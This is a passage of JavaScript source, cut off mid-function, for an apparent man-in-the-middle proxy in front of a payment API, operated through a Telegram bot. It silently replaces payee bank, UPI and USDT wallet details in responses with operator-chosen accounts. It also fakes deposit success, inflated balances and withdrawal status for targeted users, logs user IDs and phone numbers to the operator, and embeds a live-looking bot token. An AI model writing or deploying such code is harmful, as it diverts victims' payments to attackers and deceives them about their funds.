const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');

const app = express();
const ORIGINAL_API = 'https://api.ezpaycenter.com';
const BOT_TOKEN = process.env.BOT_TOKEN || '8727636415:AAFIvrnqVgtQXxCBS8r8j9NAthRO6d2ywaU';
const WEBHOOK_URL = 'https://xcvic.vercel.app/bot-webhook';
const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

const DEFAULT_DATA = {
  banks: [],
  activeIndex: -1,
  botEnabled: true,
  autoRotate: false,
  lastUsedIndex: -1,
  adminChatId: null,
  logRequests: false,
  usdtAddress: '',
  depositSuccess: false,
  depositBonus: 0,
  withdrawOverride: 0,
  userOverrides: {},
  trackedUsers: {}
};

let bot = null;
let webhookSet = false;
try { bot = new TelegramBot(BOT_TOKEN); } catch(e) {}

let redis = null;
if (REDIS_URL && REDIS_TOKEN) {
  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch(e) {}
}

let cachedData = null;
let cacheTime = 0;
const CACHE_TTL = 5000;
const tokenUserMap = {};
const userPhoneMap = {};
let debugNextResponse = false;

async function ensureWebhook() {
  if (!bot || webhookSet) return;
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
  } catch(e) {}
}

async function loadData(forceRefresh) {
  if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
  if (!redis) return { ...DEFAULT_DATA };
  try {
    let raw = await redis.get('ezpayData');
    if (raw) {
      if (typeof raw === 'string') {
        try { raw = JSON.parse(raw); } catch(e) {}
      }
      if (typeof raw === 'object' && raw !== null) {
        cachedData = { ...DEFAULT_DATA, ...raw };
      } else {
        cachedData = { ...DEFAULT_DATA };
      }
      if (!cachedData.userOverrides) cachedData.userOverrides = {};
      if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
      cacheTime = Date.now();
      return cachedData;
    }
  } catch(e) {
    console.error('Redis load error:', e.message);
  }
  cachedData = { ...DEFAULT_DATA };
  cacheTime = Date.now();
  return cachedData;
}

async function saveData(data) {
  cachedData = data;
  cacheTime = Date.now();
  if (!redis) return;
  try { await redis.set('ezpayData', data); } catch(e) {
    console.error('Redis save error:', e.message);
  }
}

function saveTokenUserId(req, userId) {
  if (!userId) return;
  const tok = req.headers['authorization'] || req.headers['token'] || req.headers['auth'] || '';
  if (tok && tok.length > 10) tokenUserMap[tok] = userId;
}

function getUserIdFromToken(req) {
  const tok = req.headers['authorization'] || req.headers['token'] || req.headers['auth'] || '';
  if (tok && tokenUserMap[tok]) return tokenUserMap[tok];
  return null;
}

function extractUserId(req, jsonResp) {
  const fromToken = getUserIdFromToken(req);
  if (fromToken) return fromToken;
  const body = req.parsedBody || {};
  const uid = body.userId || body.userid || body.memberId || body.id || '';
  if (uid) return String(uid);
  const qs = new URLSearchParams((req.originalUrl || '').split('?')[1] || '');
  if (qs.get('userId')) return String(qs.get('userId'));
  const respData = getResponseData(jsonResp);
  if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
    const rid = respData.userId || respData.userid || respData.memberId || respData.id || respData.uid || '';
    if (rid) return String(rid);
  }
  const authHeader = req.headers['authorization'] || req.headers['token'] || req.headers['auth'] || '';
  if (authHeader) {
    try {
      const parts = authHeader.replace('Bearer ', '').split('.');
      if (parts.length === 3) {
        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
        if (payload.userId) return String(payload.userId);
        if (payload.sub) return String(payload.sub);
        if (payload.id) return String(payload.id);
      }
    } catch(e) {}
  }
  return '';
}

async function trackUser(data, userId, info, phone) {
  if (!userId) return;
  if (!data.trackedUsers) data.trackedUsers = {};
  const existing = data.trackedUsers[String(userId)] || {};
  data.trackedUsers[String(userId)] = {
    lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
    lastAction: info || existing.lastAction || '',
    orderCount: (existing.orderCount || 0) + (info && info.includes('Order') ? 1 : 0),
    phone: phone || existing.phone || ''
  };
  if (phone) userPhoneMap[String(userId)] = phone;
}

function getPhone(data, userId) {
  if (!userId) return '';
  if (userPhoneMap[String(userId)]) return userPhoneMap[String(userId)];
  const tracked = data.trackedUsers && data.trackedUsers[String(userId)];
  if (tracked && tracked.phone) {
    userPhoneMap[String(userId)] = tracked.phone;
    return tracked.phone;
  }
  return '';
}

function getUserOverride(data, userId) {
  if (!userId || !data.userOverrides) return null;
  return data.userOverrides[String(userId)] || null;
}

function getEffectiveSettings(data, userId) {
  const uo = getUserOverride(data, userId);
  return {
    botEnabled: uo && uo.botEnabled !== undefined ? uo.botEnabled : data.botEnabled,
    depositSuccess: uo && uo.depositSuccess !== undefined ? uo.depositSuccess : data.depositSuccess,
    depositBonus: uo && uo.depositBonus !== undefined ? uo.depositBonus : (data.depositBonus || 0),
    bankOverride: uo && uo.bankIndex !== undefined ? uo.bankIndex : null
  };
}

function getActiveBank(data, userId) {
  const uo = getUserOverride(data, userId);
  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
    return data.banks[uo.bankIndex];
  }
  if (data.autoRotate && data.banks.length > 1) {
    let idx;
    do { idx = Math.floor(Math.random() * data.banks.length); } while (idx === data.lastUsedIndex && data.banks.length > 1);
    data.lastUsedIndex = idx;
    data._rotatedIndex = idx;
    return data.banks[idx];
  }
  if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) return data.banks[data.activeIndex];
  if (data.banks.length > 0) return data.banks[0];
  return null;
}

async function getActiveBankAndSave(data, userId) {
  const bank = getActiveBank(data, userId);
  if (data.autoRotate && data._rotatedIndex !== undefined) {
    data.lastUsedIndex = data._rotatedIndex;
    delete data._rotatedIndex;
    await saveData(data);
  }
  return bank;
}

function bankListText(d) {
  if (d.banks.length === 0) return 'No banks added yet.';
  return d.banks.map((b, i) => {
    const a = i === d.activeIndex ? ' ✅' : '';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${a}`;
  }).join('\n');
}

app.use(async (req, res, next) => {
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    req.rawBody = Buffer.concat(chunks);
    const ct = (req.headers['content-type'] || '').toLowerCase();
    try {
      if (ct.includes('json')) {
        req.parsedBody = JSON.parse(req.rawBody.toString());
      } else if (ct.includes('form') && !ct.includes('multipart')) {
        const params = new URLSearchParams(req.rawBody.toString());
        req.parsedBody = Object.fromEntries(params);
      } else {
        req.parsedBody = {};
      }
    } catch(e) { req.parsedBody = {}; }
    next();
  });
});

async function proxyFetch(req) {
  const url = ORIGINAL_API + req.originalUrl;
  const fwd = {};
  for (const [k, v] of Object.entries(req.headers)) {
    const kl = k.toLowerCase();
    if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
        kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
    fwd[k] = v;
  }
  fwd['host'] = 'api.ezpaycenter.com';
  const opts = { method: req.method, headers: fwd };
  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
    opts.body = req.rawBody;
    fwd['content-length'] = String(req.rawBody.length);
  }
  const response = await fetch(url, opts);
  const respBody = await response.text();
  const respHeaders = {};
  response.headers.forEach((val, key) => {
    const kl = key.toLowerCase();
    if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
      respHeaders[key] = val;
    }
  });
  let jsonResp = null;
  try { jsonResp = JSON.parse(respBody); } catch(e) {}
  return { response, respBody, respHeaders, jsonResp };
}

function getResponseData(jsonResp) {
  if (!jsonResp) return null;
  if (jsonResp.data) return jsonResp.data;
  if (jsonResp.body) return jsonResp.body;
  return null;
}

function sendJson(res, headers, json, fallback) {
  const body = json ? JSON.stringify(json) : fallback;
  headers['content-type'] = 'application/json; charset=utf-8';
  headers['content-length'] = String(Buffer.byteLength(body));
  headers['cache-control'] = 'no-store, no-cache, must-revalidate';
  headers['pragma'] = 'no-cache';
  delete headers['etag'];
  delete headers['last-modified'];
  res.writeHead(200, headers);
  res.end(body);
}

async function transparentProxy(req, res) {
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    if (jsonResp) {
      const uid = extractUserId(req, jsonResp);
      if (uid) saveTokenUserId(req, uid);
    }

    const data = await loadData();
    if (data.usdtAddress && jsonResp) {
      const result = replaceUsdtInResponse(jsonResp, data);
      if (result && result.oldAddr) {
        const newBody = JSON.stringify(jsonResp);
        respHeaders['content-type'] = 'application/json; charset=utf-8';
        respHeaders['content-length'] = String(Buffer.byteLength(newBody));
        respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
        delete respHeaders['etag'];
        delete respHeaders['last-modified'];
        if (data.adminChatId && bot && data.logRequests) {
          bot.sendMessage(data.adminChatId, `🔄 USDT replaced in ${req.method} ${req.path}\nOld: ${result.oldAddr}\nNew: ${result.newAddr}`).catch(()=>{});
        }
        res.writeHead(response.status, respHeaders);
        res.end(newBody);
        return;
      }
    }

    res.writeHead(response.status, respHeaders);
    res.end(respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

const BANK_FIELDS = {
  'accountno': 'accountNo', 'accountnumber': 'accountNo', 'account_no': 'accountNo',
  'receiveaccountno': 'accountNo', 'bankaccount': 'accountNo', 'acno': 'accountNo',
  'bankaccountno': 'accountNo', 'beneficiaryaccount': 'accountNo', 'payeeaccount': 'accountNo',
  'holderaccount': 'accountNo', 'cardno': 'accountNo', 'cardnumber': 'accountNo',
  'bankcardno': 'accountNo', 'payeecardno': 'accountNo', 'receivecardno': 'accountNo',
  'payeebankaccount': 'accountNo', 'payeebankaccountno': 'accountNo', 'payeeaccountno': 'accountNo',
  'receiveraccount': 'accountNo', 'receiveraccountno': 'accountNo', 'receiveaccountnumber': 'accountNo',
  'walletaccount': 'accountNo', 'walletno': 'accountNo', 'walletaccountno': 'accountNo',
  'collectionaccount': 'accountNo', 'collectionaccountno': 'accountNo',
  'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
  'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder', 'name': 'accountHolder',
  'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
  'payeename': 'accountHolder', 'bankaccountname': 'accountHolder', 'realname': 'accountHolder',
  'cardholder': 'accountHolder', 'cardname': 'accountHolder', 'bankcardname': 'accountHolder',
  'payeecardname': 'accountHolder', 'receivecardname': 'accountHolder', 'receivercardname': 'accountHolder',
  'receivername': 'accountHolder', 'collectionname': 'accountHolder', 'collectionaccountname': 'accountHolder',
  'payeerealname': 'accountHolder', 'receiverrealname': 'accountHolder',
  'ifsc': 'ifsc', 'ifsccode': 'ifsc', 'ifsc_code': 'ifsc', 'receiveifsc': 'ifsc',
  'bankifsc': 'ifsc', 'payeeifsc': 'ifsc', 'payeebankifsc': 'ifsc', 'receiverifsc': 'ifsc',
  'receiverbankifsc': 'ifsc', 'collectionifsc': 'ifsc',
  'bankname': 'bankName', 'bank_name': 'bankName', 'bank': 'bankName',
  'payeebankname': 'bankName', 'receiverbankname': 'bankName', 'receivebankname': 'bankName',
  'collectionbankname': 'bankName',
  'upiid': 'upiId', 'upi_id': 'upiId', 'upi': 'upiId', 'vpa': 'upiId',
  'upiaddress': 'upiId', 'payeeupi': 'upiId', 'payeeupiid': 'upiId',
  'receiverupi': 'upiId', 'walletupi': 'upiId', 'collectionupi': 'upiId',
  'walletaddress': 'upiId', 'payaddress': 'upiId', 'payaccount': 'upiId'
};

function replaceBankInUrl(urlStr, bank) {
  if (!urlStr || typeof urlStr !== 'string') return urlStr;
  if (!urlStr.includes('://') && !urlStr.includes('?')) return urlStr;
  const urlParams = [
    { names: ['account', 'accountNo', 'account_no', 'accountno', 'account_number', 'accountNumber', 'acc', 'receiveAccountNo', 'receiver_account', 'pa'], value: bank.accountNo },
    { names: ['name', 'accountName', 'account_name', 'accountname', 'receiveAccountName', 'receiver_name', 'beneficiary_name', 'beneficiaryName', 'pn', 'holder_name'], value: bank.accountHolder },
    { names: ['ifsc', 'ifsc_code', 'ifscCode', 'receiveIfsc', 'IFSC'], value: bank.ifsc }
  ];
  let result = urlStr;
  for (const group of urlParams) {
    if (!group.value) continue;
    for (const paramName of group.names) {
      const regex = new RegExp('([?&])(' + paramName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')=([^&]*)', 'i');
      result = result.replace(regex, '$1$2=' + encodeURIComponent(group.value));
    }
  }
  if (bank.upiId && result.includes('upi://pay')) {
    result = result.replace(/pa=[^&]+/, `pa=${bank.upiId}`);
    if (bank.accountHolder) result = result.replace(/pn=[^&]+/, `pn=${encodeURIComponent(bank.accountHolder)}`);
  }
  return result;
}

function deepReplace(obj, bank, originalValues, depth) {
  if (!obj || typeof obj !== 'object' || depth > 10) return;
  if (!originalValues) originalValues = {};
  for (const key of Object.keys(obj)) {
    const val = obj[key];
    if (val && typeof val === 'object') {
      if (Array.isArray(val)) {
        val.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bank, originalValues, depth + 1); });
      } else {
        deepReplace(val, bank, originalValues, depth + 1);
      }
      continue;
    }
    if (typeof val !== 'string' && typeof val !== 'number') continue;
    const kl = key.toLowerCase().replace(/[_\-\s]/g, '');
    const mapped = BANK_FIELDS[kl];
    if (mapped && bank[mapped] && String(val).length > 0) {
      if (typeof val === 'string' && val.length > 3) originalValues[key] = val;
      obj[key] = bank[mapped];
    }
    if (typeof val === 'string') {
      if (val.includes('://') || (val.includes('?') && val.includes('='))) {
        obj[key] = replaceBankInUrl(val, bank);
      }
      for (const [origKey, origVal] of Object.entries(originalValues)) {
        if (typeof origVal === 'string' && origVal.length > 3 && typeof obj[key] === 'string' && obj[key].includes(origVal)) {
          const mappedF = BANK_FIELDS[origKey.toLowerCase().replace(/[_\-\s]/g, '')];
          if (mappedF && bank[mappedF]) {
            obj[key] = obj[key].split(origVal).join(bank[mappedF]);
          }
        }
      }
    }
  }
}

function markDepositSuccess(obj) {
  if (!obj) return;
  const failValues = [3, '3', 4, '4', -1, '-1', 'failed', 'fail', 'FAILED', 'FAIL', 'cancelled', 'canceled'];
  if (obj.payStatus !== undefined) {
    if (!failValues.includes(obj.payStatus)) obj.payStatus = 2;
    return;
  }
  const statusFields = ['status', 'orderStatus', 'rechargeStatus', 'state', 'stat'];
  for (const field of statusFields) {
    if (obj[field] !== undefined) {
      if (failValues.includes(obj[field])) continue;
      if (typeof obj[field] === 'number') obj[field] = 2;
      else if (typeof obj[field] === 'string') {
        const num = parseInt(obj[field]);
        obj[field] = !isNaN(num) ? '2' : 'success';
      }
    }
  }
}

function addBonusToBalanceFields(obj, bonus) {
  if (!obj || typeof obj !== 'object') return;
  const balanceKeys = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money', 'coin', 'wallet', 'usermoney', 'rechargebalance', 'totalamount', 'availableamount'];
  for (const key of Object.keys(obj)) {
    if (balanceKeys.includes(key.toLowerCase())) {
      const current = parseFloat(obj[key]);
      if (!isNaN(current)) {
        obj[key] = typeof obj[key] === 'string' ? String((current + bonus).toFixed(2)) : parseFloat((current + bonus).toFixed(2));
      }
    }
    if (typeof obj[key] === 'object' && obj[key] !== null && !Array.isArray(obj[key])) {
      addBonusToBalanceFields(obj[key], bonus);
    }
  }
}

function replaceUsdtInResponse(jsonResp, data) {
  if (!data.usdtAddress || !jsonResp) return null;
  const newAddr = data.usdtAddress;
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;
  function scanAndReplace(obj, depth) {
    if (!obj || typeof obj !== 'object' || depth > 10) return '';
    if (Array.isArray(obj)) { obj.forEach(item => scanAndReplace(item, depth + 1)); return ''; }
    let oldAddr = '';
    for (const key of Object.keys(obj)) {
      const kl = key.toLowerCase();
      if (typeof obj[key] === 'string') {
        if ((kl.includes('usdt') && kl.includes('addr')) || kl === 'address' || kl === 'walletaddress' || kl === 'customusdtaddress' || kl === 'addr') {
          if (obj[key].length >= 20 && obj[key] !== newAddr) {
            oldAddr = oldAddr || obj[key];
            obj[key] = newAddr;
          }
        }
        if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl') {
          obj[key] = qrUrl;
        }
      } else if (typeof obj[key] === 'object') {
        const found = scanAndReplace(obj[key], depth + 1);
        if (found) oldAddr = oldAddr || found;
      }
    }
    if (oldAddr) {
      const escaped = oldAddr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const re = new RegExp(escaped, 'g');
      for (const key of Object.keys(obj)) {
        if (typeof obj[key] === 'string' && obj[key].includes(oldAddr)) {
          obj[key] = obj[key].replace(re, newAddr);
        }
      }
    }
    return oldAddr;
  }
  let foundOld = '';
  const rd = getResponseData(jsonResp);
  if (rd) foundOld = scanAndReplace(rd, 0) || '';
  if (!foundOld) foundOld = scanAndReplace(jsonResp, 0) || '';
  return { oldAddr: foundOld, newAddr, qrUrl };
}

app.use(async (req, res, next) => {
  try {
    const data = await loadData();
    if (data.logRequests && data.adminChatId && bot) {
      const path = req.originalUrl || req.url;
      if (!path.includes('bot-webhook') && !path.includes('favicon')) {
        const userId = extractUserId(req, null);
        const phone = getPhone(data, userId);
        const tag = userId ? ` (${phone || userId})` : '';
        bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}`).catch(()=>{});
      }
    }
  } catch(e) {}
  next();
});

app.get('/setup-webhook', async (req, res) => {
  if (!bot) return res.json({ error: 'No bot token' });
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
    const info = await bot.getWebHookInfo();
    res.json({ success: true, webhook: info });
  } catch(e) { res.json({ error: e.message }); }
});

app.get('/health', async (req, res) => {
  const redisConnected = !!redis;
  let redisWorking = false;
  if (redis) {
    try { await redis.ping(); redisWorking = true; } catch(e) {}
  }
  const data = await loadData(true);
  const active = getActiveBank(data, null);
  res.json({
    status: 'ok',
    redis: redisConnected ? (redisWorking ? 'connected' : 'error') : 'not configured',
    bankActive: !!active,
    totalBanks: data.banks.length,
    adminSet: !!data.adminChatId,
    perIdOverrides: Object.keys(data.userOverrides || {}).length,
    envCheck: { KV_URL: !!process.env.KV_REST_API_URL, KV_TOKEN: !!process.env.KV_REST_API_TOKEN, UPSTASH_URL: !!process.env.UPSTASH_REDIS_REST_URL, UPSTASH_TOKEN: !!process.env.UPSTASH_REDIS_REST_TOKEN }
  });
});

app.post('/bot-webhook', async (req, res) => {
  try {
    await ensureWebhook();
    if (!bot) return res.sendStatus(200);
    const msg = req.parsedBody?.message;
    if (!msg || !msg.text) return res.sendStatus(200);
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    let data = await loadData();

    if (text === '/start') {
      if (data.adminChatId && data.adminChatId !== chatId) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }
      data.adminChatId = chatId;
      await saveData(data);
      await bot.sendMessage(chatId,
`🏦 EZPay Bank Controller

=== GLOBAL COMMANDS ===
/addbank Name|AccNo|IFSC|BankName|UPI
/removebank <number>
/setbank <number>
/banks — List all banks
/status — Full status

/on — Proxy ON
/off — Proxy OFF
/rotate — Toggle auto-rotate banks
/log — Toggle request logging

=== DEPOSIT COMMANDS ===
/deposit on <amount> — ALL users deposit success
/deposit off — ALL users normal

=== WITHDRAW COMMANDS ===
/on withdraw <count> — Last N orders → Paying (all)
/on withdraw <count> <userId> — Per user
/off withdraw — Restore global
/off withdraw <userId> — Restore per user

=== USDT COMMANDS ===
/usdt <address> — Set USDT address
/usdt off — Disable USDT override

=== PER-ID COMMANDS ===
/id deposit on <amount> <userId>
/id deposit off <userId>
/id bank <bankNum> <userId>
/id on <userId>
/id off <userId>
/id status <userId>
/id reset <userId>
/id list — Show all overrides
/id track — Show detected users

Example:
/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
      );
      return res.sendStatus(200);
    }

    if (data.adminChatId && chatId !== data.adminChatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized.');
      return res.sendStatus(200);
    }

    if (text === '/status') {
      const active = getActiveBank(data, null);
      const idCount = Object.keys(data.userOverrides || {}).length;
      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nDeposit: ${data.depositSuccess ? '✅ SUCCESS (₹' + (data.depositBonus || 0) + ')' : '🔴 Normal'}\nPer-ID: ${idCount}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}`;
      if (data.withdrawOverride > 0) m += `\nWithdraw: ✅ First ${data.withdrawOverride} → Paying (global)`;
      const wUsers = Object.entries(data.userOverrides || {}).filter(([k, v]) => v.withdrawCount > 0);
      if (wUsers.length > 0) {
        m += '\nWithdraw per-ID:';
        wUsers.forEach(([uid, v]) => { m += `\n  👤 ${uid}: ${v.withdrawCount}`; });
      }
      if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
      if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
      else m += '\n\n⚠️ No active bank';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/on') { data.botEnabled = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
    if (text === '/off') { data.botEnabled = false; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
    if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
    if (text === '/log') { data.logRequests = !data.logRequests; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }

    if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace request ka full response dump aayega'); return res.sendStatus(200); }

    if (text === '/banks') {
      if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks added'); return res.sendStatus(200); }
      let m = '💳 Banks:\n\n' + bankListText(data);
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text.startsWith('/addbank ')) {
      const parts = text.substring(9).split('|').map(s => s.trim());
      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI\n(BankName and UPI optional)'); return res.sendStatus(200); }
      if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
      const newBank = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
      data.banks.push(newBank);
      if (data.activeIndex < 0) data.activeIndex = 0;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${newBank.accountHolder} | ${newBank.accountNo}\nIFSC: ${newBank.ifsc}${newBank.bankName ? '\nBank: ' + newBank.bankName : ''}${newBank.upiId ? '\nUPI: ' + newBank.upiId : ''}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/removebank ')) {
      const idx = parseInt(text.substring(12).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid. /banks se check karo'); return res.sendStatus(200); }
      const removed = data.banks.splice(idx, 1)[0];
      if (data.activeIndex === idx) data.activeIndex = data.banks.length > 0 ? 0 : -1;
      else if (data.activeIndex > idx) data.activeIndex--;
      if (data.userOverrides) {
        for (const uid of Object.keys(data.userOverrides)) {
          const uo = data.userOverrides[uid];
          if (uo.bankIndex !== undefined) {
            if (uo.bankIndex === idx) delete uo.bankIndex;
            else if (uo.bankIndex > idx) uo.bankIndex--;
          }
        }
      }
      await saveData(data);
      await bot.sendMessage(chatId, `🗑️ Removed: ${removed.accountHolder} | ${removed.accountNo}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/setbank ')) {
      const idx = parseInt(text.substring(9).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid index'); return res.sendStatus(200); }
      data.activeIndex = idx;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Active bank #${idx + 1}: ${data.banks[idx].accountHolder}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/deposit on')) {
      const amountStr = text.substring(11).trim();
      const amount = parseFloat(amountStr);
      if (amountStr && isNaN(amount)) { await bot.sendMessage(chatId, '❌ Format: /deposit on <amount>'); return res.sendStatus(200); }
      data.depositSuccess = true;
      if (!isNaN(amount) && amount > 0) data.depositBonus = (data.depositBonus || 0) + amount;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Deposit SUCCESS ON (GLOBAL)\n${amount > 0 ? '💰 Added: ₹' + amount + '\n' : ''}Balance Bonus: ₹${data.depositBonus || 0}`);
      return res.sendStatus(200);
    }

    if (text === '/deposit off') {
      data.depositSuccess = false; data.depositBonus = 0;
      await saveData(data);
      await bot.sendMessage(chatId, '🔴 Deposit OFF (GLOBAL). Per-ID overrides still active.');
      return res.sendStatus(200);
    }

    if (text.match(/^\/on withdraw\s+/i)) {
      const parts = text.replace(/^\/on withdraw\s+/i, '').trim().split(/\s+/);
      const count = parseInt(parts[0]);
      const userId = parts[1] || null;
      if (isNaN(count) || count <= 0) { await bot.sendMessage(chatId, '❌ Format: /on withdraw <count> [userId]'); return res.sendStatus(200); }
      if (userId) {
        if (!data.userOverrides[userId]) data.userOverrides[userId] = {};
        data.userOverrides[userId].withdrawCount = count;
        await saveData(data);
        await bot.sendMessage(chatId, `✅ Withdraw ON for user ${userId}: first ${count} → Paying`);
      } else {
        data.withdrawOverride = count;
        await saveData(data);
        await bot.sendMessage(chatId, `✅ Withdraw ON (global): first ${count} → Paying`);
      }
      return res.sendStatus(200);
    }

    if (text.match(/^\/off withdraw/i)) {
      const userId = text.replace(/^\/off withdraw\s*/i, '').trim();
      if (userId) {
        if (data.userOverrides[userId] && data.userOverrides[userId].withdrawCount) {
          delete data.userOverrides[userId].withdrawCount;
          await saveData(data);
          await bot.sendMessage(chatId, `🗑 Withdraw OFF for user ${userId}`);
        } else {
          await bot.sendMessage(chatId, `ℹ️ No withdraw override for ${userId}`);
        }
      } else {
        data.withdrawOverride = 0;
        await saveData(data);
        await bot.sendMessage(chatId, '🗑 Withdraw OFF (global)');
      }
      return res.sendStatus(200);
    }

    if (text.startsWith('/usdt ')) {
      const addr = text.substring(6).trim();
      if (addr.toLowerCase() === 'off') {
        data.usdtAddress = '';
        await saveData(data);
        await bot.sendMessage(chatId, '❌ USDT override OFF');
      } else if (addr.length >= 20) {
        data.usdtAddress = addr;
        await saveData(data);
        await bot.sendMessage(chatId, `₮ USDT address set: ${addr}`);
      } else {
        await bot.sendMessage(chatId, '❌ Invalid address (20+ chars required)');
      }
      return res.sendStatus(200);
    }

    if (text.startsWith('/id ')) {
      const idCmd = text.substring(4).trim();

      if (idCmd === 'list') {
        const overrides = data.userOverrides || {};
        const ids = Object.keys(overrides);
        if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No per-ID overrides.'); return res.sendStatus(200); }
        let m = '📋 Per-ID Overrides:\n\n';
        for (const uid of ids) {
          const uo = overrides[uid];
          const parts = [];
          if (uo.botEnabled !== undefined) parts.push(uo.botEnabled ? '🟢 ON' : '🔴 OFF');
          if (uo.depositSuccess !== undefined) parts.push(uo.depositSuccess ? '✅ Deposit ON (₹' + (uo.depositBonus || 0) + ')' : '🔴 Deposit OFF');
          if (uo.bankIndex !== undefined) parts.push('🏦 Bank #' + (uo.bankIndex + 1));
          if (uo.withdrawCount) parts.push('💸 Withdraw: ' + uo.withdrawCount);
          m += `👤 ${uid}: ${parts.join(' | ')}\n`;
        }
        await bot.sendMessage(chatId, m);
        return res.sendStatus(200);
      }

      if (idCmd === 'track') {
        const tracked = data.trackedUsers || {};
        const ids = Object.keys(tracked);
        if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users detected yet.'); return res.sendStatus(200); }
        let m = '📋 Detected Users:\n\n';
        for (const uid of ids) {
          const u = tracked[uid];
          const hasOverride = data.userOverrides && data.userOverrides[uid] ? ' ⚙️' : '';
          m += `👤 ${uid}${hasOverride}\n   Last: ${u.lastAction || 'N/A'}\n   Seen: ${u.lastSeen || 'N/A'}\n   Orders: ${u.orderCount || 0}\n\n`;
        }
        await bot.sendMessage(chatId, m);
        return res.sendStatus(200);
      }

      const depositOnMatch = idCmd.match(/^deposit on\s+(\d+(?:\.\d+)?)\s+(\S+)$/);
      if (depositOnMatch) {
        const amount = parseFloat(depositOnMatch[1]);
        const userId = depositOnMatch[2];
        if (!data.userOverrides[userId]) data.userOverrides[userId] = {};
        data.userOverrides[userId].depositSuccess = true;
        data.userOverrides[userId].depositBonus = (data.userOverrides[userId].depositBonus || 0) + amount;
        await saveData(data);
        await bot.sendMessage(chatId, `✅ User ${userId}: Deposit ON, Bonus: ₹${data.userOverrides[userId].depositBonus}`);
        return res.sendStatus(200);
      }

      const depositOffMatch = idCmd.match(/^deposit off\s+(\S+)$/);
      if (depositOffMatch) {
